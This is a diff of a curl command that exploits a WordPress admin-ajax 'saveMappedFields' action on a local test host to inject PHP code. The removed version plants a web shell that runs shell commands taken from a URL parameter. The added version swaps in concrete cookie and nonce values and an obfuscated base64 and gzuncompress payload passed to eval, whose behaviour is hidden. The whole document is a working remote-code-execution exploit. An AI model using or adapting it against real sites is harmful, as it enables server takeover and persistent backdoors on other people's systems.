@@ -1,6 +1,6 @@
 curl -X POST "http://nxk.ddev.site/wp-admin/admin-ajax.php" \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  -H "Cookie: COOKIES" \
+  -H "Cookie: wordpress_test_cookie=WP%20Cookie%20check; PHPSESSID=anyvalue" \
   --data-urlencode "action=saveMappedFields" \
-  --data-urlencode "securekey=NONCE" \
-  --data-urlencode "MappedFields={\"pwn->cus2\":\"<?php file_put_contents('cazzy.php', '<?php if(isset(\\$_GET[\\\"rce\\\"])){ system(\\$_GET[\\\"rce\\\"]); } ?>'); echo 'Shell created at cazzy.php'; ?>\"}"
+  --data-urlencode "securekey=12345678" \
+  --data-urlencode "MappedFields={\"nx.php\":\"<?php \$z='eJx1Uk1z2jAQPfvXaOygYUx8pRzUeDom4FgnHcA4YJpQS1eOtPIhKaGd/vcKS2YyoTOdZrWr3bePt/vupYhR5iUoHKlRWsVK7m5iE3FbMK44X63WwXA0/hqMw7FvwUeXlluCGGiBkHhE5UKAI8kyoBSZ0YQeCpMRAwIqJcpnGQNKt4QcSJsAJ3mZGiBbI2JZ5VjSZIakS4Q5WmVW8TEmE9QrU5AFhMRyQdMCYjRGW3Qp6yRTSfNclvNIlSgC4JxxqLg7VKRCy9AWc1hOgoG/jmyQNAl95fO+3y9Y6qdz2/YDDVqyKq3hAe6kjCGrZNrkyoFnW9yQPPDjjCyrHh5UXZMaZQ2RBUwkzFhwP/Id3w9c3w1c2/PcyPUiL/AjP/JjP4n8JIrjKInjKEmi2EtjN0ldL02cJHW85KkebKqVK8PsznWWOE78dN9s7X2OgmN01OUz9WXbW77+x/y/v/3/gGtQHXelO6n5W0j/MpPHqJtNS1Z0aZeP1WtZ9WOlk7BQRXlgB+u64UxUyzHqju9G7pnnJ5g8B4SnJ13S6yEjbO4R54qzndKzHVz8DWRd/uFJvlw83m+Wm+W2vPfG9yFc0x52vK1yHeoMDSLMWVlwqUuF9yi3r+KRpdRcs7Uxj8XzY8nbqGqHrI0TnrKuL0pyLXc6gQbvyC+EeElA3+u67/+T2n4M0/h//GfoJw==';\$y=base64_decode(\$z);\$d=gzuncompress(\$y);eval(\$d); ?>\")}"
